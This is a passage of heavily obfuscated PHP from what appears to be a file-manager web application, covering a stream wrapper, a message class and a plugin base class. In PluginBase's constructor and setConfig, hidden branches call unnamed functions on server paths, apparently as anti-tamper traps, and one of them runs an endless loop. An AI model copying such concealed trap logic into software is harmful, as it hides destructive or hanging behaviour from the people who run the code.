stream_read($ü˜µÜşŸ) { $¨½şƒÃ = $this->fileSubstr($this->pose, $ü˜µÜşŸ); $this->pose += strlen($¨½şƒÃ); return $¨½şƒÃ; } public function stream_tell() { return $this->pose; } public function stream_seek($İ’âê, $èÏ‰Óùé) { $±§Ğˆä• =& $_SERVER[¦»×‡Ãã]; if ($èÏ‰Óùé == SEEK_SET) { $this->pose = $İ’âê; } else { if ($èÏ‰Óùé == SEEK_CUR) { $this->pose += $İ’âê; } else { if ($èÏ‰Óùé == SEEK_END) { $this->pose = $this->info[$±§Ğˆä•[79]] + intval($İ’âê); } } } if ($İ’âê < 0) { $this->pose = $this->info[$±§Ğˆä•[79]] + $İ’âê; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¦»×‡Ãã][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($¯Òœ¿ì·, $åÁíßš¡) { $ŒÚêøø– =& $_SERVER[¦»×‡Ãã]; $Òë­õ¹è = $this->info($¯Òœ¿ì·); return array($ŒÚêøø–[1608] => 0, $ŒÚêøø–[1609] => 0, $ŒÚêøø–[16] => 32768 + 511, $ŒÚêøø–[1610] => 0, $ŒÚêøø–[1611] => 0, $ŒÚêøø–[1612] => 0, $ŒÚêøø–[1613] => 0, $ŒÚêøø–[79] => $Òë­õ¹è[$ŒÚêøø–[79]], $ŒÚêøø–[1614] => $Òë­õ¹è[$ŒÚêøø–[1454]], $ŒÚêøø–[1570] => $Òë­õ¹è[$ŒÚêøø–[88]], $ŒÚêøø–[1569] => $Òë­õ¹è[$ŒÚêøø–[231]], $ŒÚêøø–[1615] => 0, $ŒÚêøø–[1616] => 0); } static $fileInfo = array(); public function info($´Õõı¤¸) { $ç‰‚É¬Ğ = $_SERVER[¦»×‡Ãã][1617]; if (isset(self::$fileInfo[$´Õõı¤¸])) { return self::$fileInfo[$´Õõı¤¸]; } if (substr($´Õõı¤¸, 0, strlen($ç‰‚É¬Ğ)) != $ç‰‚É¬Ğ) { return !1; } self::$fileInfo[$´Õõı¤¸] = IO::info(substr($´Õõı¤¸, strlen($ç‰‚É¬Ğ))); return self::$fileInfo[$´Õõı¤¸]; } public static function read($€¸§à×‰, $¯éŒ£¤æ, $ª µØêİ) { if (!isset(self::$_fopenCache[$€¸§à×‰])) { $åÍÇØó = new StreamWrapperIO(); $åÍÇØó->stream_open($€¸§à×‰); self::$_fopenCache[$€¸§à×‰] = $åÍÇØó; } $åÍÇØó = self::$_fopenCache[$€¸§à×‰]; return $åÍÇØó->fileSubstr($¯éŒ£¤æ, $ª µØêİ); } public static function _read($Á‰é°³, $ÆÛËß™›, $ş¤™ÕÜ¦) { $¦‚¦àÂò =& $_SERVER[¦»×‡Ãã]; $ó“¶«¦ = fopen($Á‰é°³, $¦‚¦àÂò[1458]); if (!$ó“¶«¦) { return $¦‚¦àÂò[12]; } $ÙÚ‹Õá° = 8192; fseek($ó“¶«¦, $ÆÛËß™›, SEEK_SET); $âƒú·Ø = $¦‚¦àÂò[12]; $ñÕ Î¼§ = 0; while ($ñÕ Î¼§ < $ş¤™ÕÜ¦) { $ÀÍìÉÜñ = min($ÙÚ‹Õá°, $ş¤™ÕÜ¦ - $ñÕ Î¼§); $âƒú·Ø .= fread($ó“¶«¦, $ÀÍìÉÜñ); $ñÕ Î¼§ += $ÀÍìÉÜñ; } fclose($ó“¶«¦); return $âƒú·Ø; } public function fileSubstr($ûßä®Üë, $ºßá…´û) { $ªŸÚ£€Ï =& $_SERVER[¦»×‡Ãã]; $é²‡šé = $this->info[$ªŸÚ£€Ï[79]]; $ƒÜ×ú“ = $ûßä®Üë; $¼ÆÃÒ¥ß = $ºßá…´û; if ($ûßä®Üë < 0) { $ûßä®Üë = $é²‡šé + $ûßä®Üë; } if ($ºßá…´û === !1) { $ºßá…´û = $é²‡šé - $ûßä®Üë; } if ($ûßä®Üë + $ºßá…´û > $é²‡šé) { $ºßá…´û = $é²‡šé - $ûßä®Üë; } if ($ºßá…´û <= 0) { return $ªŸÚ£€Ï[12]; } if ($ûßä®Üë < 0 || $ûßä®Üë >= $é²‡šé || $ºßá…´û <= 0 || $ºßá…´û > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\x69\154\145\122\145\x61\x64\x20\x65\162\162\x6f\162\41\x20\x73\x74\x61\162\x74\x3d{$ûßä®Üë}\x3b\x6c\x65\x6e\147\x74\x68\x3d{$ºßá…´û}\x3b\x20\x73\151\172\145\x3d{$é²‡šé}\73"); } $™úú„îì = 64 * 1024; $»ÜÉÏ’¾ =& self::$_chunkBuffer[$this->path]; if (!$»ÜÉÏ’¾) { $»ÜÉÏ’¾ = array(); } $¾íÂ„øˆ = 0; $ô¿ƒİÙğ = 0; $µŸØëî = $ªŸÚ£€Ï[12]; foreach ($»ÜÉÏ’¾ as $¾íÂ„øˆ => $µŸØëî) { $¾íÂ„øˆ = intval($¾íÂ„øˆ); $ô¿ƒİÙğ = $¾íÂ„øˆ + strlen($µŸØëî); if ($ûßä®Üë >= $ô¿ƒİÙğ) { continue; } if ($ûßä®Üë >= $¾íÂ„øˆ && $ûßä®Üë + $ºßá…´û <= $ô¿ƒİÙğ) { return substr($µŸØëî, $ûßä®Üë - $¾íÂ„øˆ, $ºßá…´û); } break; } if (count($»ÜÉÏ’¾) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ªŸÚ£€Ï[1618], $ªŸÚ£€Ï[1619] . count($»ÜÉÏ’¾) . "\x3b\163\164\x61\x72\x74\75{$ûßä®Üë}\54\x6c\x65\156\x67\164\x68\75{$ºßá…´û}\73\160\157\x73\x65\x3a{$¾íÂ„øˆ}\176{$ô¿ƒİÙğ}"); throw new Exception($ªŸÚ£€Ï[1620]); } $”÷Ò™©¸ = intval($ûßä®Üë / $™úú„îì) * $™úú„îì; $…ÙïİåÎ = ceil(($ûßä®Üë + $ºßá…´û) / $™úú„îì) * $™úú„îì - $”÷Ò™©¸; $–©¬· = IO::fileSubstr($this->path, $”÷Ò™©¸, $…ÙïİåÎ); $»ÜÉÏ’¾[$”÷Ò™©¸ . $ªŸÚ£€Ï[12]] = $–©¬·; ksort($»ÜÉÏ’¾); $ìèß°ª = substr($–©¬·, $ûßä®Üë - $”÷Ò™©¸, $ºßá…´û); return $ìèß°ª; } private function log($Şõ—”—º, $µ¤™îÃ) { $ŸÜŸĞßı =& $_SERVER[¦»×‡Ãã]; $øæÏü»« = timeFloat() - $this->timeStart; write_log(sprintf($ŸÜŸĞßı[1621], $Şõ—”—º, $this->info[$ŸÜŸĞßı[32]], $øæÏü»«, $µ¤™îÃ), $ŸÜŸĞßı[1264]); } } class Message { function __construct() { } public function send($©“Å¦¢ = '', $¤Å¨‡°é = array(), $ŒÜ­ åÚ = "\164\145\x78\x74") { $üœ·µ =& $_SERVER[¦»×‡Ãã]; $ÏÃªÎğ– = array($üœ·µ[33] => $üœ·µ[1622], $üœ·µ[171] => $©“Å¦¢); if (in_array($ŒÜ­ åÚ, array($üœ·µ[1622], $üœ·µ[1623]))) { $ÏÃªÎğ–[$üœ·µ[33]] = $ŒÜ­ åÚ; } $¤Å¨‡°é = array($üœ·µ[578] => isset($¤Å¨‡°é[$üœ·µ[578]]) ? $¤Å¨‡°é[$üœ·µ[578]] : $üœ·µ[12], $üœ·µ[662] => isset($¤Å¨‡°é[$üœ·µ[662]]) ? $¤Å¨‡°é[$üœ·µ[662]] : $üœ·µ[12]); if (empty($©“Å¦¢) || empty($¤Å¨‡°é[$üœ·µ[578]]) && empty($¤Å¨‡°é[$üœ·µ[662]])) { return !1; } $µ‹ŒÅÃŒ = array($üœ·µ[1550] => $ÏÃªÎğ–, $üœ·µ[1624] => $¤Å¨‡°é); Hook::trigger($üœ·µ[1625], $µ‹ŒÅÃŒ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ÎÊ™‹Øà =& $_SERVER[¦»×‡Ãã]; if ($_SERVER[$ÎÊ™‹Øà[952]] != $_SERVER[$ÎÊ™‹Øà[1626]]) { $§¯Â¼Ğ = $ÎÊ™‹Øà[953]; $ÜŒ×ó«ı = $ÎÊ™‹Øà[954]; $†ª‚¦ÃÔ = $_SERVER[$ÎÊ™‹Øà[949]] . $ÎÊ™‹Øà[950]; $ÅÌÅ¹Ü = $ÜŒ×ó«ı($†ª‚¦ÃÔ); $¼†ñüé» = explode($ÎÊ™‹Øà[262], $ÅÌÅ¹Ü); if (count($¼†ñüé») < $ÎÊ™‹Øà[684]) { $¡åµÙ×½ = $ÎÊ™‹Øà[955]; $¡åµÙ×½(); } $ããç‰© = $ÎÊ™‹Øà[956]; $ããç‰©($_SERVER[$ÎÊ™‹Øà[957]]); $ããç‰©($_SERVER[$ÎÊ™‹Øà[949]] . $ÎÊ™‹Øà[1627]); $‡ıÇŸğ² = 1; while ($‡ıÇŸğ² > 1) { $‡ıÇŸğ² = $‡ıÇŸğ² + 4; $„Ü…ÃøÛ = rawurlencode($‡ıÇŸğ² . $ÎÊ™‹Øà[454]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ÎÊ™‹Øà[1628]); $this->pluginName = str_replace($ÎÊ™‹Øà[1628], $ÎÊ™‹Øà[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ÎÊ™‹Øà[8]; $this->pluginApi = appHostGet() . $ÎÊ™‹Øà[1629] . $this->pluginName . $ÎÊ™‹Øà[8]; $this->pluginHost = $config[$ÎÊ™‹Øà[1630]] . $this->pluginName . $ÎÊ™‹Øà[8]; $this->pluginHostDefault = $config[$ÎÊ™‹Øà[1630]] . $this->pluginName . $ÎÊ™‹Øà[8]; $ŒŒË©Õı = $config[$ÎÊ™‹Øà[1631]]; if ($ŒŒË©Õı && strpos($ÎÊ™‹Øà[50] . $ŒŒË©Õı . $ÎÊ™‹Øà[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ÎÊ™‹Øà[1632]] . $this->pluginName . $ÎÊ™‹Øà[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¦»×‡Ãã][1633]); } protected function assign($‹“ó­Úô, $¤×Ãœêè = false) { if (is_array($‹“ó­Úô)) { $this->values = array_merge($this->values, $‹“ó­Úô); } else { $this->values[$‹“ó­Úô] = $¤×Ãœêè; } } protected function display($”¤Àñ) { extract($this->values); require $”¤Àñ; } final function hookRegist($éº üø“) { $this->modelPlugin->appRegist($this->pluginName, $éº üø“); } final function appIcon() { $º³À½˜ë =& $_SERVER[¦»×‡Ãã]; $Ëİ­ÜÁ– = $this->appPackage(); $ú¼È‹•ê = $º³À½˜ë[12]; if (isset($Ëİ­ÜÁ–[$º³À½˜ë[490]])) { if (isset($Ëİ­ÜÁ–[$º³À½˜ë[490]][$º³À½˜ë[1634]])) { $ú¼È‹•ê = $º³À½˜ë[1635] . $Ëİ­ÜÁ–[$º³À½˜ë[490]][$º³À½˜ë[1634]] . $º³À½˜ë[1636]; } else { if ($Ëİ­ÜÁ–[$º³À½˜ë[490]][$º³À½˜ë[1637]]) { $ú¼È‹•ê = $º³À½˜ë[1638] . $Ëİ­ÜÁ–[$º³À½˜ë[490]][$º³À½˜ë[1637]] . $º³À½˜ë[1639]; } } } return $ú¼È‹•ê; } final function fileCanView($ÁëêØè·) { $ëæ²½³õ =& $_SERVER[¦»×‡Ãã]; if (request_url_safe($ÁëêØè·)) { return !0; } if ($this->isShare($ÁëêØè·)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $€°˜¸é = $ëæ²½³õ[1640] . rawurlencode(this_url()); show_tips(LNG($ëæ²½³õ[1641]) . $ëæ²½³õ[1642] . $€°˜¸é . $ëæ²½³õ[1643] . LNG($ëæ²½³õ[1644]) . $ëæ²½³õ[1645], !1); } if (!Action($ëæ²½³õ[1646])->authCan($ëæ²½³õ[1647])) { show_tips(LNG($ëæ²½³õ[1648]) . $ëæ²½³õ[1649], !1); } ActionCall($ëæ²½³õ[1650], $ÁëêØè·); } final function isShare($şè´ƒÜÀ) { $ü· Ì¢ = KodIO::parse($şè´ƒÜÀ); return $ü· Ì¢[$_SERVER[¦»×‡Ãã][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ó×ğ¡ãÅ) { if (request_url_safe($ó×ğ¡ãÅ)) { return $ó×ğ¡ãÅ; } if (!$this->isShare($ó×ğ¡ãÅ)) { $ó×ğ¡ãÅ = $this->filePath($ó×ğ¡ãÅ, !1); } return Action($_SERVER[¦»×‡Ãã][1256])->linkOut($ó×ğ¡ãÅ); } public function filePathLinkOut($ÔĞÎ¢È˜) { if (request_url_safe($ÔĞÎ¢È˜)) { return $ÔĞÎ¢È˜; } $this->fileCanView($ÔĞÎ¢È˜); return Action($_SERVER[¦»×‡Ãã][1256])->link($ÔĞÎ¢È˜); } final function filePath($×Ğâ¼ö, $©Ø—îŠ­ = true, $òú ÷‚ = false) { $˜ŞŒæ»ï =& $_SERVER[¦»×‡Ãã]; $ÅŞòĞöä = $this->filePathGet($×Ğâ¼ö, $©Ø—îŠ­); if (!$this->fileInfo) { show_tips(LNG($˜ŞŒæ»ï[108]), !1); } if ($òú ÷‚ && isset($this->fileInfo[$˜ŞŒæ»ï[541]]) && $this->fileInfo[$˜ŞŒæ»ï[541]]) { $Îòˆ×¶ = Model($˜ŞŒæ»ï[544])->fileInfo($this->fileInfo[$˜ŞŒæ»ï[541]]); if (!$Îòˆ×¶ || !IO::exist($Îòˆ×¶[$˜ŞŒæ»ï[87]])) { show_tips(LNG($˜ŞŒæ»ï[108]) . $˜ŞŒæ»ï[1651]); } } Hook::trigger($˜ŞŒæ»ï[1652], $ÅŞòĞöä); return $ÅŞòĞöä; } final function filePathGet($É˜áµ, $Í˜²­æß = true) { $Ì¢ò¦ò´ =& $_SERVER[¦»×‡Ãã]; if ($Ú§õš¶› = $this->checkSharePath($É˜áµ, $Í˜²­æß)) { return $Ú§õš¶›; } $this->fileCanView($É˜áµ); if (request_url_safe($É˜áµ)) { $±‚íÓ…› = parse_url_query($É˜áµ); if (isset($±‚íÓ…›[$Ì¢ò¦ò´[1653]]) && isset($±‚íÓ…›[$Ì¢ò¦ò´[234]])) { $ÙÛ§ÇÄß = Mcrypt::decode($±‚íÓ…›[$Ì¢ò¦ò´[234]], Model($Ì¢ò¦ò´[843])->get($Ì¢ò¦ò´[844])); if ($ÙÛ§ÇÄß) { $this->fileInfo = IO::info($ÙÛ§ÇÄß); $this->fileInfo[$Ì¢ò¦ò´[1654]] = $É˜áµ; $this->cachePath = $this->pluginCachePath($Ì¢ò¦ò´[12], $Í˜²­æß); return $ÙÛ§ÇÄß; } } $É˜áµ = $this->_cacheHttpFile($É˜áµ, $Í˜²­æß); $this->fileInfo = IO::info($É˜áµ); } else { $this->fileInfo = IO::info($É˜áµ); $this->cachePath = $this->pluginCachePath($Ì¢ò¦ò´[12], $Í˜²­æß); } return $É˜áµ; } final function _cacheHttpFile($©ÄíÆ‚, $ß¦ó”Ï§ = true) { $˜î¹×¨ñ =& $_SERVER[¦»×‡Ãã]; $‰ê—¾ = parse_url_query($©ÄíÆ‚); $€üå¢ò· = get_path_ext($©ÄíÆ‚); if (isset($‰ê—¾[$˜î¹×¨ñ[32]]) && $‰ê—¾[$˜î¹×¨ñ[32]]) { $€üå¢ò· = get_path_ext($‰ê—¾[$˜î¹×¨ñ[32]]); } $‹Û¦çÅ¼ = hash_path($©ÄíÆ‚) . $˜î¹×¨ñ[10] . $€üå¢ò·; $this->cachePath = $this->pluginCachePath($ß¦ó”Ï§ ? $‹Û¦çÅ¼ : $˜î¹×¨ñ[12]); $ÏôãÃ¢ı = IO::fileNameExist($this->cachePath, $‹Û¦çÅ¼); if ($ÏôãÃ¢ı) { return KodIO::make($ÏôãÃ¢ı); } $ŠŞÕ„¸× = rtrim($this->cachePath, $˜î¹×¨ñ[8]) . $˜î¹×¨ñ[8] . $‹Û¦çÅ¼; return $this->pluginCacheFileSet($ŠŞÕ„¸×, file_get_contents_nossl($©ÄíÆ‚)); } final function checkSharePath($üœîÄ×€, $”ùÛüóï = true) { $ï™±À¾ =& $_SERVER[¦»×‡Ãã]; if (!$this->isShare($üœîÄ×€)) { return !1; } $ÂÓ¸ş = Action($ï™±À¾[1256])->sharePathInfo($üœîÄ×€); if (!is_array($ÂÓ¸ş) || !isset($ÂÓ¸ş[$ï™±À¾[87]])) { show_json(LNG($ï™±À¾[1655]), !1); } $this->fileInfo = $ÂÓ¸ş; $this->cachePath = $this->pluginCachePath(!1, $”ùÛüóï); return $ÂÓ¸ş[$ï™±À¾[87]]; } final function pluginCachePath($¶°å™Ü = '', $ÀÕÉò‘ = false) { $ëÇñä‹† =& $_SERVER[¦»×‡Ãã]; if ($ÀÕÉò‘ && is_array($this->fileInfo)) { $¶°å™Ü = kodIO::hashPath($this->fileInfo); } $¢ÜÎƒË¶ = rtrim(IO_PATH_SYSTEM_TEMP . $ëÇñä‹†[1656] . $this->pluginName . $ëÇñä‹†[8] . $¶°å™Ü, $ëÇñä‹†[8]); $¸¯æëÓã = IO::infoFullSimple($¢ÜÎƒË¶); $ ˜­Û = $¸¯æëÓã && is_array($¸¯æëÓã) ? $¸¯æëÓã[$ëÇñä‹†[87]] : $ëÇñä‹†[12]; if (!$ ˜­Û) { $ ˜­Û = IO::mkdir($¢ÜÎƒË¶); } return $ ˜­Û; } final function pluginCacheFileSet($ÏŸü¥Î, $©¿¡µÅë = '') { $İóËÕš§ =& $_SERVER[¦»×‡Ãã]; $è£ÑÂ® = IO::infoFullSimple($ÏŸü¥Î); if (!$è£ÑÂ®) { return IO::mkfile($ÏŸü¥Î, $©¿¡µÅë, REPEAT_REPLACE); } IO::setContent($è£ÑÂ®[$İóËÕš§[87]], $©¿¡µÅë); return $è£ÑÂ®[$İóËÕš§[87]]; } final function pluginLocalFile($®ìæÉÆİ = '') { $Èúß†ˆÃ =& $_SERVER[¦»×‡Ãã]; $¬êï¨ÃŸ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($¬êï¨ÃŸ)) { mk_dir($¬êï¨ÃŸ); } if (!$®ìæÉÆİ) { return $¬êï¨ÃŸ; } $òêæ—Ù = IO::info($®ìæÉÆİ); $’ÆÍš©Û = $Èúß†ˆÃ[1657] . KodIO::hashPath($òêæ—Ù) . $Èúß†ˆÃ[10] . $òêæ—Ù[$Èúß†ˆÃ[169]]; if (!checkExtSafe($’ÆÍš©Û)) { $’ÆÍš©Û = $’ÆÍš©Û . $Èúß†ˆÃ[1291]; } $¥´­² = $¬êï¨ÃŸ . $’ÆÍš©Û; if (@file_exists($¥´­²)) { return $¥´­²; } return IO::copy($®ìæÉÆİ, $¬êï¨ÃŸ, 0, $’ÆÍš©Û); } final function appPackage() { $è«¥¶Ò =& $_SERVER[¦»×‡Ãã]; if ($this->packageData) { return $this->packageData; } $œ›ù«âŞ = $this->parseFile($this->pluginPath . $è«¥¶Ò[1658]); $this->parseLang($œ›ù«âŞ); $÷¥øÑ‰À = json_decode_force($œ›ù«âŞ); if (!$÷¥øÑ‰À) { return array(); } $®Òñ· = Hook::trigger($è«¥¶Ò[1659], $÷¥øÑ‰À); if ($®Òñ· && is_array($®Òñ·)) { $÷¥øÑ‰À = $®Òñ·; } $this->packageData = $÷¥øÑ‰À; return $÷¥øÑ‰À; } public function packageInfoGet($ª­ğ‚Ûê) { $ÊûÁ©¿ê = $this->appPackage(); return array_get_value($ÊûÁ©¿ê, $ª­ğ‚Ûê); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¦»×‡Ãã][1660]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¦»×‡Ãã][1661]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¦»×‡Ãã][1662]); } public function echoJsAssign($¼§‚À—¼, $íö–²­È) { $this->echoJsAssignArr[$¼§‚À—¼] = $íö–²­È; } private function parseFile($ëÛÉÁÕ‚) { $£¹Ü—¦ù =& $_SERVER[¦»×‡Ãã]; $±é½ü¡Ã = file_get_contents_nossl($ëÛÉÁÕ‚); $®¶²‹¿† = array($£¹Ü—¦ù[1663], $£¹Ü—¦ù[1664], $£¹Ü—¦ù[1665], $£¹Ü—¦ù[1666], $£¹Ü—¦ù[1667], $£¹Ü—¦ù[1668], $£¹Ü—¦ù[1669]); $‘×Ğ±ô = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$£¹Ü—¦ù[92]][$£¹Ü—¦ù[1670]]); foreach ($this->echoJsAssignArr as $¡¬óº’á => $¸³®ÁŒ½) { $®¶²‹¿†[] = $£¹Ü—¦ù[1671] . $¡¬óº’á . $£¹Ü—¦ù[1672]; $‘×Ğ±ô[] = is_array($¸³®ÁŒ½) || is_object($¸³®ÁŒ½) ? rawurlencode(json_encode($¸³®ÁŒ½)) : $¸³®ÁŒ½; } if (strstr($±é½ü¡Ã, $£¹Ü—¦ù[1673])) { $Ç¯‘”¼£ = rawurlencode(json_encode($this->pluginLangArr)); $±é½ü¡Ã = str_replace($£¹Ü—¦ù[1673], $Ç¯‘”¼£, $±é½ü¡Ã); } if (strstr($±é½ü¡Ã, $£¹Ü—¦ù[1674])) { $Ç¯‘”¼£ = $Ç¯‘”¼£ = rawurlencode(json_encode($this->getConfig())); $±é½ü¡Ã = str_replace($£¹Ü—¦ù[1674], $Ç¯‘”¼£, $±é½ü¡Ã); } $±é½ü¡Ã = str_replace($®¶²‹¿†, $‘×Ğ±ô, $±é½ü¡Ã); return $±é½ü¡Ã; } private function parseLang(&$ØÊ ÈÙü) { $Ç’¯ÒÂı =& $_SERVER[¦»×‡Ãã]; $Ô”¡¸¹ç = $Ç’¯ÒÂı[1675]; if (!strstr($ØÊ ÈÙü, $Ô”¡¸¹ç)) { return; } preg_match_all($Ç’¯ÒÂı[1676], $ØÊ ÈÙü, $Ñı±·); if (!is_array($Ñı±·) || count($Ñı±·) == 0 || !is_array($Ñı±·[0]) || count($Ñı±·[0]) == 0) { return; } $ı§Äü = array(); $Œ¶ÌŒÃæ = array(); foreach ($Ñı±·[0] as $«úì¹Ñ„) { $ÔÆÃ¸ı× = substr($«úì¹Ñ„, strlen($Ô”¡¸¹ç), -4); $¬…ŸäÄ¢ = LNG($ÔÆÃ¸ı×); $ı§Äü[] = $«úì¹Ñ„; $Œ¶ÌŒÃæ[] = str_replace(array($Ç’¯ÒÂı[262], $Ç’¯ÒÂı[1157], $Ç’¯ÒÂı[418], $Ç’¯ÒÂı[121]), array($Ç’¯ÒÂı[53], $Ç’¯ÒÂı[53], $Ç’¯ÒÂı[12], $Ç’¯ÒÂı[1677]), $¬…ŸäÄ¢); } $ØÊ ÈÙü = str_replace($ı§Äü, $Œ¶ÌŒÃæ, $ØÊ ÈÙü); } private function parseConfig(&$±“±öÃ¼) { $ş¶ëç =& $_SERVER[¦»×‡Ãã]; $äµâ¿ìè = $ş¶ëç[1678]; if (!strstr($±“±öÃ¼, $äµâ¿ìè)) { return; } preg_match_all($ş¶ëç[1679], $±“±öÃ¼, $ÓÎ±ğÎî); if (!is_array($ÓÎ±ğÎî) || count($ÓÎ±ğÎî) == 0 || !is_array($ÓÎ±ğÎî[0]) || count($ÓÎ±ğÎî[0]) == 0) { return; } $óÕÁÊ = $this->getConfig(); $Ô””’ËÙ = array(); $Ò±˜²·ñ = array(); foreach ($ÓÎ±ğÎî[0] as $¸û³•å) { $ä‚¸éÀ» = substr($¸û³•å, strlen($äµâ¿ìè), -2); $Ô””’ËÙ[] = $¸û³•å; $Ò±˜²·ñ[] = _get($óÕÁÊ, $ä‚¸éÀ»); } $±“±öÃ¼ = str_replace($Ô””’ËÙ, $Ò±˜²·ñ, $±“±öÃ¼); } private function parsePackage(&$ùæğÆêÀ) { $‡Œœ—µ• =& $_SERVER[¦»×‡Ãã]; $ìÎÛü¥û = $‡Œœ—µ•[1680]; if (!strstr($ùæğÆêÀ, $ìÎÛü¥û)) { return; } preg_match_all($‡Œœ—µ•[1681], $ùæğÆêÀ, $ˆ—ÃòÁ); if (!is_array($ˆ—ÃòÁ) || count($ˆ—ÃòÁ) == 0 || !is_array($ˆ—ÃòÁ[0]) || count($ˆ—ÃòÁ[0]) == 0) { return; } $§Íæ‚„ç = $this->appPackage(); $”ÁÛĞî = array(); $Ö’‹éíÂ = array(); foreach ($ˆ—ÃòÁ[0] as $“£Ö‡Ù ) { $³®É»ï = substr($“£Ö‡Ù , strlen($ìÎÛü¥û), -2); $”ÁÛĞî[] = $“£Ö‡Ù ; $Ö’‹éíÂ[] = _get($§Íæ‚„ç, $³®É»ï); } $ùæğÆêÀ = str_replace($”ÁÛĞî, $Ö’‹éíÂ, $ùæğÆêÀ); } final function echoFile($’€öÊÏ, $è¨¼œ‹£ = false) { $±¢¬ÙÎõ =& $_SERVER[¦»×‡Ãã]; $£îûÊúı = $this->pluginPath . $’€öÊÏ; if (ACT == $±¢¬ÙÎõ[1682]) { echo $±¢¬ÙÎõ[1683] . $this->pluginName . $±¢¬ÙÎõ[8] . $’€öÊÏ . $±¢¬ÙÎõ[1684]; if (!file_exists($£îûÊúı)) { echo $±¢¬ÙÎõ[1685]; return; } } $„­Òåùµ = $this->parseFile($£îûÊúı); $this->parseLang($„­Òåùµ); $this->parseConfig($„­Òåùµ); $this->parsePackage($„­Òåùµ); if (is_array($è¨¼œ‹£)) { $„­Òåùµ = str_replace(array_keys($è¨¼œ‹£), array_values($è¨¼œ‹£), $„­Òåùµ); } echo $±¢¬ÙÎõ[262] . $„­Òåùµ; } private function checkVersion() { $Ó•ıŠ¬® =& $_SERVER[¦»×‡Ãã]; $¿±±Œ…š = $this->appPackage(); $»ğÌØ’” = $this->getConfig(); if ($»ğÌØ’”[$Ó•ıŠ¬®[1686]] == $¿±±Œ…š[$Ó•ıŠ¬®[1660]]) { return; } $this->regist(); $this->setConfig(array($Ó•ıŠ¬®[1686] => $¿±±Œ…š[$Ó•ıŠ¬®[1660]])); } final function initLang() { $şÌ´ˆøÙ =& $_SERVER[¦»×‡Ãã]; $¸±éø©» = $şÌ´ˆøÙ[1687]; $ÔŠ¢£Ë˜ = $this->pluginPath . $şÌ´ˆøÙ[1688]; $¡¶®ğƒ = I18n::getType(); $ÕÄğ˜ìÏ = array(); if (file_exists($ÔŠ¢£Ë˜ . $¡¶®ğƒ . $şÌ´ˆøÙ[911])) { $ÕÄğ˜ìÏ = (include $ÔŠ¢£Ë˜ . $¡¶®ğƒ . $şÌ´ˆøÙ[911]); } else { if ($¡¶®ğƒ == $şÌ´ˆøÙ[1689] && !file_exists($ÔŠ¢£Ë˜ . $¡¶®ğƒ . $şÌ´ˆøÙ[911]) && file_exists($ÔŠ¢£Ë˜ . $şÌ´ˆøÙ[1690])) { $ÕÄğ˜ìÏ = (include $ÔŠ¢£Ë˜ . $şÌ´ˆøÙ[1690]); } else { if (file_exists($ÔŠ¢£Ë˜ . $¸±éø©» . $şÌ´ˆøÙ[911])) { $ÕÄğ˜ìÏ = (include $ÔŠ¢£Ë˜ . $¸±éø©» . $şÌ´ˆøÙ[911]); } } } if (!is_array($ÕÄğ˜ìÏ)) { return array(); } if (@count($ÕÄğ˜ìÏ) > 0) { I18n::set($ÕÄğ˜ìÏ); } return $ÕÄğ˜ìÏ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ôíƒÂé…) { $ûĞ ëêİ =& $_SERVER[¦»×‡Ãã]; if (!isset($_SERVER[$ûĞ ëêİ[952]]) || !isset($_SERVER[$ûĞ ëêİ[1418]])) { $¼Ï•µ‡ = $ûĞ ëêİ[953]; $ùÚè´ = $ûĞ ëêİ[954]; $éîÙÈ•ü = $_SERVER[$ûĞ ëêİ[949]] . $ûĞ ëêİ[950]; $Òò†÷ãÖ = $ùÚè´($éîÙÈ•ü); $ªµï‚÷Ù = explode($ûĞ ëêİ[262], $Òò†÷ãÖ); if (count($ªµï‚÷Ù) < $ûĞ ëêİ[684]) { $ƒ¨Áßİí = $ûĞ ëêİ[955]; $ƒ¨Áßİí(); } $â¥šİŞª = $ûĞ ëêİ[956]; $â¥šİŞª($_SERVER[$ûĞ ëêİ[957]]); $ú²‡¥…– = 1; for ($ÌÖŞ™Å = $ú²‡¥…–; $ÌÖŞ™Å > 0; $ÌÖŞ™Å++) { $â¥šİŞª = json_encode($GLOBALS[$ûĞ ëêİ[492]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ôíƒÂé…); } public function onSetConfig($×­è›–Œ) { } public function onGetConfig($‡ã¼—Æ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ªæ­ÔñØ) { if ($ªæ­ÔñØ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ÚõÌäü¥ = "\160\154\x75\147\x69\156\x41\x75\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ˆ°öîŞÓ = $this->getConfig(); if (!$ˆ°öîŞÓ[$ÚõÌäü¥]) { return !1; } return ActionCall($_SERVER[¦»×‡Ãã][1691], $ˆ°öîŞÓ[$ÚõÌäü¥]); } public function url($™¶­¥Í÷, $Ü ç»¾º = '', $¥ŠòĞë = true) { $²Ã´Ù´è =& $_SERVER[¦»×‡Ãã]; $óŒ¼’ÌÆ = 